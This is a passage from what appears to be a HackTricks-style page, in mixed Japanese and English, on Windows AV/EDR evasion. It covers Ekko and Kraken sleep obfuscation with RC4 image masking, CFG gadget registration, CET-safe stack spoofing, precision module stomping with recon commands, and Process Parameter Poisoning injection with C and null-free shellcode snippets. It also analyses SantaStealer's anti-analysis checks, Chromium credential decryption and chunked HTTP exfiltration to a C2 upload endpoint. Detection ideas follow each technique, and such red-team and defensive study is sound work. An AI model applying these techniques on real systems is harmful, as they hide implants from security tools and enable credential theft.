
`Sleep` を patch する代わりに、implant が使用する **actual wait/IPC primitives**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook する。long wait では、Ekko-style obfuscation chain で call を wrap し、idle 中に in-memory image を encrypt する:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使用して、crafted `CONTEXT` frame で `NtContinue` を call する callback sequence を schedule する。
- Typical chain（x64）: image を `PAGE_READWRITE` に設定 → mapped image 全体に対して `advapi32!SystemFunction032` で RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を走査して **per-section permissions を restore** → completion を signal する。
- `RtlCaptureContext` は template `CONTEXT` を提供する。これを複数の frame に clone し、各 step を invoke するために register（`Rip/Rcx/Rdx/R8/R9`）を設定する。

Operational detail: long wait（例: `WAIT_OBJECT_0`）に対して “success” を return し、image が masked されている間も caller が続行するようにする。この pattern は idle window 中に module を scanner から隠し、classic な “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst。
- 大きく連続した image-sized buffer に対する `advapi32!SystemFunction032` の使用。
- 大きな範囲の `VirtualProtect` に続く custom per-section permission restoration。

### sleep-obfuscation gadget の runtime CFG registration

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は、通常 `STATUS_STACK_BUFFER_OVERRUN` により process を crash させる。これは gadget が module の CFG metadata に存在しないためである。hardened process 内で Ekko/Kraken-style chain を維持するには:<sup>[[30]](#references)</sup>

- chain が使用するすべての indirect destination を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で register する。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**full image size** をカバーする必要がある。
- manually mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使用する。
- dispatch gadget だけでなく、indirect に到達する exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls）および indirect target になる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style sleep chain は “non-CFG process でのみ動作する” ものから、`explorer.exe`、browsers、`svchost.exe`、その他 `/guard:cf` で compile された endpoint に対して再利用可能な primitive になる。

### sleeping thread の CET-safe stack spoofing

Full `CONTEXT` replacement は noisy であり、spoof された `Rip` が hardware shadow stack と一致する必要があるため、CET Shadow Stack system では破綻する可能性がある。より安全な sleep-masking pattern は次のとおり:<sup>[[30]](#references)</sup>

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` を介してその `NT_TIB` / TEB の stack bounds（`StackBase`、`StackLimit`）を読み取る。
- current thread の real TEB/TIB を backup する。
- `GetThreadContext` で real sleeping context を capture する。
- real `Rip` **のみ**を spoof context に copy し、spoofed `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate stack range 内で unwind するようにする。
- wait 完了後、original TIB と thread context を restore する。

これにより CET-consistent な instruction pointer を維持しつつ、TEB stack metadata を信頼して unwind を検証する EDR stack walker を mislead できる。

### APC-based alternative: Kraken Mask

timer-queue dispatch の signature が強すぎる場合、同じ sleep-encrypt-spoof-restore sequence を queued APC 経由で suspended helper thread から実行できる:<sup>[[27]](#references)</sup>

- entrypoint に `NtTestAlert` を指定して helper thread を作成する。
- `NtQueueApcThread` で prepared `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- default 64 KB thread stack を使い果たさないよう、chain state を helper stack ではなく heap に保存する。
- `NtSignalAndWaitForSingleObject` を使用して start event の signal と block を atomically 実行する。
- TIB/context を restore する前に main thread を suspend し（`NtSuspendThread` → restore → `NtResumeThread`）、scanner が half-restored stack を捕捉できる race window を縮小する。

これは同じ RC4 masking と stack-spoofing の目的を維持しながら、`CreateTimerQueueTimer` + `NtContinue` signature を helper-thread/APC signature に置き換える。

Additional detection ideas
- sleep、wait、または APC dispatch の直前に行われる `VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で wrap された `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` に続く、current thread の TEB/TIB stack bounds への direct write。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に indirect に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような short gadget signature を繰り返し使用すること。


## Precision Module Stomping

Module stomping は、明らかに目立つ private executable memory を allocate したり、新しい sacrificial DLL を load したりする代わりに、target process 内にすでに mapped されている DLL の **`.text` section から payload を実行する**。overwrite target には、**loaded、disk-backed image** を選ぶ必要がある。これは、process が引き続き必要とする code path を破壊せずに payload を収容できる code space を持つものである。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような common module に対する naive な stomping は fragile である。その DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次のとおり:

1. target process の module を enumerate し、すでに load されている DLL の **names-only include list** を保持する。
2. payload を先に build し、**exact byte size** を記録する。
3. disk 上の candidate DLL を scan し、PE section **`.text` の `Misc_VirtualSize`** と payload size を比較する。これは file size より重要である。mapped 時の executable section のサイズを反映するためである。
4. **Export Address Table (EAT)** を parse し、export された function の RVA を stomp start offset として選択する。
5. **blast radius** を計算する。payload が selected function boundary を超える場合、memory 上でその後に配置された隣接 export を overwrite する。

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- `LoadLibrary`/unexpected image loads による telemetry を避けるため、remote process ですでに **loaded** されている DLL を優先する。
- target application がほとんど実行しない exports を優先する。そうしないと、thread creation の前後に通常の code path が stomped bytes に到達する可能性がある。
- 大規模な implant では、injector source 内で buffer 全体が正しく表現されるよう、shellcode の埋め込みを string literal から **byte-array/braced initializer** に変更する必要があることが多い。

Detection ideas
- より一般的な private RWX/RX allocations ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）への remote writes。
- メモリ上の export entry points の bytes が、ディスク上の backing file と一致しなくなっているもの。
- 最近 first bytes が変更された legitimate DLL export 内から実行を開始する remote threads または context pivots。
- DLL `.text` pages に対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の sequence と、それに続く thread creation。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、classic remote write path（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique である。すでに実行中の target に bytes を copy する代わりに、Windows が `CreateProcessW` の startup parameters の一部を child process に **copy** し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存する仕組みを悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によって copy される Poisonable carriers

Useful carriers は次のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` 使用時）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine` は `CreateProcessW` のために **writable memory** を指している必要があり、null terminator を含めて **32,767 Unicode characters** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` strings で構成され、追加の `\0` で終端された Unicode environment block でなければならない。
- `lpReserved` は公式には reserved であるため、`ShellInfo` mapping は、安定した documented contract ではなく implementation detail として扱うべきである。

これにより、通常の process creation が **payload-transfer primitive** になる。operator は attacker-controlled startup data を指定して child process を作成し、Windows に cross-process copy を実行させる。

### Remote write APIs を使用しない Remote lookup flow

child が作成された後、**read-only** primitives を使用して copy された buffer を解決する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. remote `PEB` を Read
3. `PEB.ProcessParameters` を Follow
4. `RTL_USER_PROCESS_PARAMETERS` を Read
5. 選択した pointer を使用:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### コピーしたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にはしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返された main thread handle を再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

classic thread hijacking workflow とは異なり、これは `SuspendThread` / `ResumeThread` を**必要としません**。返された main thread handle を直接使用して context を変更できます。

これにより、injection で一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も

### Null-byte の制限と staged shellcode

3 つの carrier はすべて**文字列または文字列に類似したデータ**であるため、`0x00` を含む raw payload は転送中に切り捨てられます。実用的な workaround は、runtime で constants を再構成し、その後任意の second stage を load する **null-free first stage** です。

単純なパターンとして、XOR ベースの constant synthesis があります。
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
これにより、first stage は、転送されるパラメータに null bytes を埋め込まずに、stack strings、API arguments、DLL paths、または second-stage shellcode loader を構築できます。

### first stage からの stack-based API calls

first stage が `LoadLibraryA` などの API を呼び出す必要がある場合、次の処理が可能です。

- target stack に string/buffer を push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインタを設定する
- call 前に `RSP` を **16-byte aligned** に保つ

その後、second stage を stack から `PAGE_READWRITE` allocation にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してから jump できます。これにより、直接的な RWX allocation を回避できます。

### Detection ideas

著者が挙げている有効な hunting opportunities:

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって **process-parameter pages が executable になる**
- その protection change に続いて `SetThreadContext` / `NtSetContextThread` が実行される
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` が remote read される
- process creation 中の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が異常に長い、または高エントロピーである

### Notes

- P3 は **cross-process transfer trick** であり、それ自体が完全な execution primitive ではありません。コピーされた parameter には、依然として execute-permission change と execution redirection method が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者によって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの suspicious primitives に到達するため、採用されませんでした。

## SantaStealer の Fileless Evasion と Credential Theft の Tradecraft

SantaStealer（別名 BluelineStealer）は、現代の info-stealer が AV bypass、anti-analysis、credential access を単一の workflow に組み合わせる方法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layout gating と sandbox delay

- config flag（`anti_cis`）は、`GetKeyboardLayoutList` を使用してインストール済みの keyboard layouts を列挙します。Cyrillic layout が見つかった場合、sample は空の `CIS` marker を作成して stealers の実行前に終了します。これにより、除外対象の locale では決して detonate しない一方で、hunting artifact を残します。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm`ロジック

- Variant Aはプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、debugger/sandbox用の埋め込みblocklistと比較する。また、コンピューター名に対してもチェックサムを繰り返し適用し、`C:\analysis`などの作業ディレクトリをチェックする。
- Variant Bはシステムプロパティ（プロセス数の下限、直近のuptime）を調査し、`OpenServiceA("VBoxGuest")`を呼び出してVirtualBox additionsを検出する。さらに、sleep前後のタイミングチェックを実行してsingle-steppingを検出する。いずれかに該当すると、modulesの起動前にabortする。

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXEはChromium credential helperを埋め込んでおり、これをディスクにdropするか、メモリ上に手動でmapする。fileless modeではimport/relocationを自身で解決するため、helperのartifactは書き込まれない。
- そのhelperは、ChaCha20（32-byte key 2個 + 12-byte nonce）で二重に暗号化されたsecond-stage DLLを保存する。両方のpassの後、blobをreflectiveにloadし（`LoadLibrary`は使用しない）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)由来のexports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator routinesは、direct-syscall reflective process hollowingを使用して稼働中のChromium browserへinjectし、AppBound Encryption keysを継承する。その後、ABE hardeningにもかかわらず、SQLite databasesからpasswords/cookies/credit cardsを直接decryptする。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`はglobalな`memory_generators` function-pointer tableを反復処理し、有効化された各module（Telegram、Discord、Steam、screenshots、documents、browser extensionsなど）ごとに1つのthreadをspawnする。各threadは結果をshared buffersに書き込み、約45秒間のjoin window後に自身のfile countを報告する。
- 完了後、すべてのデータをstatic linkされた`miniz` libraryで`%TEMP%\\Log.zip`としてzip化する。続いて`ThreadPayload1`は15秒sleepし、archiveを10 MB単位のchunkに分割して、browserの`multipart/form-data` boundary（`----WebKitFormBoundary***`）をspoofしながら、HTTP POSTで`http://<C2>:6767/upload`へstreamする。各chunkには`User-Agent: upload`、`auth: <build_id>`、任意で`w: <campaign_tag>`が追加され、最後のchunkには`complete: true`が付加されるため、C2はreassemblyの完了を認識できる。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
